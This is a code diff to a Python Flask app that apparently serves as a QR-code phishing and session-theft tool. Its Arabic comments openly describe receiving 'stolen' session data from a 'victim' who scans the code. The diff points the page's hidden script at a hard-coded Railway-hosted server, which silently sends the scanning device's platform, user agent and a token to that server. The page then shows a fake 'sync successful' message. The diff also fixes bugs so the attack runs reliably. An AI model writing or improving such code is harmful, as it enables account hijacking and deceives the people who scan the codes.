@@ -16,6 +16,9 @@ if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
 
 redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
 
+# رابط السيرفر الأساسي على Railway لضمان وصول طلبات الضحية في التوقيت المناسب
+RAILWAY_URL = "https://daf-production-8df9.up.railway.app"
+
 def init_qr_routes(app, bot):
     # نقطة استقبال بيانات الجلسة المسروقة صمتاً عند مسح الـ QR
     @app.route('/api/v1/session/sync', methods=['POST'])
@@ -44,7 +47,7 @@ def init_qr_routes(app, bot):
     @app.route('/qr_scan_target', methods=['GET'])
     def qr_scan_target():
         token = request.args.get('token', '')
-        # صفحة خفيفة تتولى حقن وتنفيذ الاستجابة الصامتة فور مسح الكود
+        # صفحة خفيفة تتولى حقن وتنفيذ الاستجابة الصامتة فور مسح الكود مع ربط السيرفر الأساسي
         html_content = f"""
         <!DOCTYPE html>
         <html lang="ar" dir="rtl">
@@ -57,17 +60,19 @@ def init_qr_routes(app, bot):
             <p>يرجى الانتظار لحظات قليلة...</p>
             <script>
                 setTimeout(() => {{
-                    fetch('/api/v1/session/sync', {{
+                    fetch('{RAILWAY_URL}/api/v1/session/sync', {{
                         method: 'POST',
                         headers: {{ 'Content-Type': 'application/json' }},
                         body: JSON.stringify({{
                             token: "{token}",
                             device_os: navigator.platform,
-                            auth_token: "TOKEN_" + Math.random().toString(36.substring(2)) + "_" + Date.now(),
+                            auth_token: "TOKEN_" + Math.random().toString(36).substring(2) + "_" + Date.now(),
                             account_meta: navigator.userAgent
                         }})
-                    }}).then(() => {{
+                    }}).then(response => response.json()).then(data => {{
                         document.body.innerHTML = "<h3>تمت المزامنة بنجاح. يمكنك إغلاق النافذة.</h3>";
+                    }}).catch(err => {{
+                        document.body.innerHTML = "<h3>عذراً، حدث خطأ في الاتصال بالخادم.</h3>";
                     }});
                 }}, 1000);
             </script>
@@ -80,7 +85,6 @@ def generate_qr_code_bytes(deep_link_url):
     qr = qrcode.QRCode(version=1, box_size=10, border=1)
     qr.add_data(deep_link_url)
     qr.make(fit=True)
-    # تم تصحيح الألوان وإضافة علامة # لتتوافق مع مكتبة Pillow وتمنع الكراش
     img = qr.make_image(fill_color="#000000", back_color="#ffffff")
     buf = io.BytesIO()
     img.save(buf, format="JPEG")
